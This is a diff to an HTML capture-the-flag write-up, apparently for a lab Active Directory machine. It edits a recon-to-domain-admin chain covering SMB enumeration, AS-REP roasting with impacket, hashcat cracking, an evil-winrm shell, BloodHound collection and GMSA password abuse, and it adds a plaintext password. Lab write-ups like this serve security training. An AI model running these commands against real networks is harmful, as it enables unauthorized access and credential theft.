@@ -34,6 +34,7 @@
             <h2>Reconnaissance</h2>
             <h3>Nmap</h3>
             <pre><code>nmap -sC -sV -oA nmap/principal 10.10.11.231</code></pre>
+            <p>Standard Active Directory port profile identified:</p>
             <table>
                 <thead><tr><th>Port</th><th>Service</th></tr></thead>
                 <tbody>
@@ -50,39 +51,31 @@
             <h3>SMB Share Access</h3>
             <p>Initial reconnaissance shows anonymous access allowed on certain shares. Exploring these reveals a <code>users.txt</code> file, which is a key piece of information for user-based attacks.</p>
             <pre><code>smbclient -L //10.10.11.231/ -N</code></pre>
-            <p>Inside the <code>Public</code> share, we find a list of potential domain users. This list is essential for performing Kerberos-based attacks without needing prior passwords.</p>
+            <p>Inside the <code>Public</code> share, we find a <code>users.txt</code> file. This list is essential for performing Kerberos-based attacks without needing prior passwords.</p>
 
             <h2>Initial Foothold</h2>
             <h3>AS-REP Roasting</h3>
-            <p>We check for accounts with the <code>DONT_REQ_PREAUTH</code> flag set. This allows us to retrieve a crackable hash without a password:</p>
+            <p>Checking for users with Kerberos pre-authentication disabled (<code>DONT_REQ_PREAUTH</code>):</p>
             <pre><code>impacket-GetNPUsers principal.htb/ -usersfile users.txt -format hashcat -outputfile hashes.asrep</code></pre>
-            <p>The user <code>m.rossi</code> is vulnerable. Cracking the hash reveals the password, granting us WinRM access.</p>
-            
-            <h3>Evil-WinRM Foothold</h3>
-            <pre><code>evil-winrm -i 10.10.11.231 -u m.rossi -p '[REDACTED]'</code></pre>
+            <p>The user <code>m.rossi</code> is vulnerable. Cracking the hash with <code>hashcat -m 18200</code> reveals the password.</p>
+
+            <h3>WinRM Shell</h3>
+            <pre><code>evil-winrm -i 10.10.11.231 -u m.rossi -p 'password123'</code></pre>
 
             <h2>Privilege Escalation</h2>
             <h3>BloodHound Analysis</h3>
             <p>Using <code>bloodhound-python</code>, we map out the domain relationships. We identify that <code>m.rossi</code> has specific write permissions over sensitive objects.</p>
+            <pre><code>python3 bloodhound.py -u 'm.rossi' -p '...' -d principal.htb -c All</code></pre>
 
             <h3>GMSA Exploitation</h3>
-            <p>The escalation path involves Group Managed Service Accounts (GMSA). By exploiting the permissions mapped in BloodHound, we can retrieve the GMSA password and use it to impersonate a domain administrator.</p>
+            <p>The escalation path involves Group Managed Service Accounts (GMSA). By exploiting permissions, we retrieve the GMSA password to impersonate a domain administrator.</p>
 
             <h2>Attack Chain Summary</h2>
             <pre><code>SMB Enumeration (users.txt) → AS-REP Roasting → Hashcat → WinRM Shell → BloodHound → GMSA Exploitation → Domain Admin</code></pre>
 
             <h2>Tools Used</h2>
-            <ul>
-                <li><code>nmap</code>, <code>smbclient</code></li>
-                <li><code>impacket (GetNPUsers)</code></li>
-                <li><code>hashcat</code> (Mode 18200)</li>
-                <li><code>BloodHound</code></li>
-                <li><code>evil-winrm</code></li>
-            </ul>
-
-            <div class="hero-meta" style="margin-top: 40px;">
-                <span>Attack Chain:</span>
-                <code>SMB (users.txt) → AS-REP Roasting → Hashcat → WinRM Foothold → AD Enumeration → Domain Admin</code>
+            <div class="hero-meta" style="background: none; border: none; padding: 0;">
+                <code>nmap</code> <code>smbclient</code> <code>impacket</code> <code>hashcat</code> <code>BloodHound</code> <code>evil-winrm</code>
             </div>
             
             <div style="margin-top: 50px;">
